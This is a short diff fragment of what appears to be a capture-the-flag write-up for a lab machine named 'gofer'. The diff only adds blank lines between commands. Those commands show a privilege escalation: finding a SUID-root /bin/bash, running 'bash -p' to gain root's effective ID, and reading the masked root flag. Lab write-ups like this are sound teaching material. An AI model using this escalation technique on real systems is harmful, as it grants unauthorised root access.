@@ -370,10 +370,16 @@ Access granted!
 Your choice: 9
 
 **tbuckley@gofer:~$ ls -la /bin/bash**
+
 -rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+
 **tbuckley@gofer:~$ /bin/bash -p**
+
 **bash-5.1# id**
+
 uid=1002(tbuckley) gid=1002(tbuckley) euid=0(root) groups=1002(tbuckley),1004(dev)
+
 **bash-5.1# cd /root**
+
 **bash-5.1# cat root.txt**
 ********************************
